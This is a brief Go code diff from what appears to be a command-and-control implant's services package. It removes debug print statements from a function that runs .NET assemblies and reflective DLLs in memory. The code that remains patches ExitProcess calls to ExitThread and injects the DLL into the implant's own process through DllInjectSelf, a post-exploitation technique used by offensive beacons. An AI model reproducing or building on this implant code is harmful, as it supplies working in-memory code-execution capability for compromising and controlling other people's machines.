@@ -3,7 +3,6 @@ package services
 import (
 	"bytes"
 	"errors"
-	"fmt"
 	"io"
 	"main/config"
 	"main/crypt"
@@ -210,9 +209,6 @@ func CmdExecuteAssemblyX64(cmdBuf []byte) ([]byte, error) {
 	}
 	if string(description) != ".NET assembly" { // data is parameter, dll is reflectivedll
 		dll = bytes.ReplaceAll(dll, []byte("ExitProcess"), []byte("ExitThread\x00"))
-		fmt.Println(string(description))
-		fmt.Println(string(data))
-		fmt.Println(string(dll))
 		return packet.DllInjectSelf(data, dll)
 	}
 	//data is Csharp, dll is environment
